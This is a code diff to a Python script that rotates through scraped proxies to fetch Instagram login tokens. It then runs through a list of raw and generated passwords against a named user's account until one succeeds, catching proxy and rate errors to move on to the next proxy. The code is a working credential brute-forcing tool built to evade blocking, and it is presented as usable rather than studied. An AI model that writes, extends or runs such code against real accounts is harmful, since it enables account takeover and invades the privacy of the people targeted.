@@ -4,7 +4,8 @@ from argparse import ArgumentParser
 import os
 
 from app import settings
-from app.exceptions import ApiBadProxyException, InstagramClientException
+from app.exceptions import (ApiBadProxyException, ApiClientException,
+    ApiTimeoutException, ApiMaxRetryError, ApiException, ApiSSLException)
 from app.lib.users import User, Users
 from app.lib.api import ProxyApi, InstagramApi
 
@@ -16,50 +17,97 @@ def test_get_proxies():
     for proxy in proxies:
         print(proxy)
 
+
+def test_get_extra_proxies():
+    proxy_api = ProxyApi(settings.PROXY_LINKS[0])
+    proxies = proxy_api.get_extra_proxies()
+    print(list(proxies))
+
+
+def get_api_token_with_proxy(user, proxy):
+    api = InstagramApi(user.username, proxy=proxy)
+    return api.fetch_token()
+
+
 def get_api_token(user):
-    token = None
-    proxy_count = 0
 
     proxy_api = ProxyApi(settings.PROXY_LINKS[0])
     proxies = list(proxy_api.get_proxies())
 
-    while token is None and proxy_count <= len(proxies) - 1:
-        proxy = proxies[proxy_count]
-        api = InstagramApi(user.username, proxy)
+    for proxy in proxies:
+        api = InstagramApi(user.username, proxy=proxy)
         try:
-            token = api.refresh_token()
-        except ApiBadProxyException:
-            print(f"Bad Proxy Found in Test {proxy}")
-            proxy_count += 1
+            token = api.fetch_token()
+        except ApiBadProxyException as e:
+            print(f"{e.__class__.__name__} error getting token... updating proxy.")
+            continue
+        except ApiClientException as e:
+            if e.error_type == 'generic_request_error':
+                print(f"{e.__class__.__name__} error getting token... updating proxy.")
+                continue
+            else:
+                raise e
         else:
-            if token is not None:
-                print(f"Got Token in Test {token}")
-                print(f"Got Proxy in Test {proxy}")
-                return token, proxy
+            print(f"Got Token in Test {token}")
+            print(f"Got Proxy in Test {proxy}")
+            return token, proxy
 
-def test_get_token():
+
+def try_login(api, password, proxies, token):
+    valid_response = False
+    proxy_count = 0
+
+    while not valid_response:
+        print(f"Trying to login with {password}")
+        proxy = proxies[proxy_count]
+        api.update_proxy(proxy)
+
+        try:
+            results = api.login(password, token=token)
+        except ApiBadProxyException as e:
+            print(f"{e.__class__.__name__}... updating proxy.")
+            proxy_count += 1
+        except ApiClientException as e:
+            if e.error_type == 'generic_request_error':
+                print(f"{e.__class__.__name__}... updating proxy.")
+                proxy_count += 1
+            else:
+                raise e
+        else:
+            valid_response = True
+
+    return results, proxy
+
+
+def test_login():
+
+    proxy_api = ProxyApi(settings.PROXY_LINKS[0])
+    proxies = list(proxy_api.get_proxies())
 
     user = User('nickmflorin')
     passwords = user.get_raw_passwords()
 
-    token, api = get_api_token(user)
-    api = InstagramApi(user.username, proxy)
+    token, proxy = get_api_token(user)
+    if not token:
+        raise Exception("Token not retrieved")
 
-    count = 0
-    while count <= len(passwords) - 1:
-        password = passwords[count]
-        try:
-            results = api.login(password, token=token)
-            print(results)
-        except ApiBadProxyException:
-            print("Bad proxy logging in user.")
+    api = InstagramApi(user.username, token=token, proxy=proxy)
+
+    for password in passwords:
+        result, proxy = try_login(api, password, proxies, token)
+        print(result)
+        if result.accessed:
+            print(f"Correct Password: {password}")
             break
-        except InstagramClientException as e:
-            print("Hit error logging in user.")
-            print(str(e))
-            break
-        else:
-            count += 1
+
+        index = proxies.index(proxy)
+        proxies = proxies[index:]
+
+
+def test_generate_passwords():
+    user = User("nickmflorin")
+    for pw in user.get_new_attempts():
+        print(pw)
 
 
 def test_create_user():
